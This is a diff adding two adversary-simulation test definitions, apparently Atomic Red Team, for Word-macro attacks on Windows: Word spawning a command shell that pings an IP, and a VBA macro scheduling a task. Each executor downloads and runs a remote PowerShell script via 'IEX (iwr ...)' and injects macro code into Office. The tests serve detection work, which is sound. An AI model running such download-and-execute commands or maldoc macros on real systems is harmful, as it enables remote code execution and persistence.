@@ -10,3 +10,74 @@ atomic_tests:
     command: |
       hostname > c:\Temp\hostname.txt 
     name: powershell
+
+- name: Word spawned a command shell and used an IP address in the command line
+  auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
+  description: |
+    Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.
+    Upon execution, CMD will be lauchned and ping 8.8.8.8
+  supported_platforms:
+  - windows
+  input_arguments:
+    jse_path:
+      description: |
+        Path for the macro to write out the "malicious" .jse file
+      type: String
+      default: C:\Users\Public\art.jse
+    ms_product:
+      description: Maldoc application Word or Excel
+      type: String
+      default: Word
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Microsoft #{ms_product} must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "#{ms_product}.Application" | Out-Null
+        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+  executor:
+    command: |
+      IEX (iwr "https://raw.githubusercontent.com/clr2of8/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
+    cleanup_command: |
+      Remove-Item #{jse_path} -ErrorAction Ignore
+    name: powershell
+- name: Task Scheduler via VBA
+  auto_generated_guid: ecd3fa21-7792-41a2-8726-2c5c673414d3
+  description: |
+    This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
+    30 - 40 seconds after this module has run
+  supported_platforms:
+  - windows
+  input_arguments:
+    ms_product:
+      description: Maldoc application Word
+      type: String
+      default: Word
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Microsoft #{ms_product} must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "#{ms_product}.Application" | Out-Null
+        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+  executor:
+    command: |
+      IEX (iwr "https://raw.githubusercontent.com/clr2of8/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing) 
+      Invoke-MalDoc -macroFile "PathToAtomicsFolder\mytest\src\macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
+    name: powershell
+
+
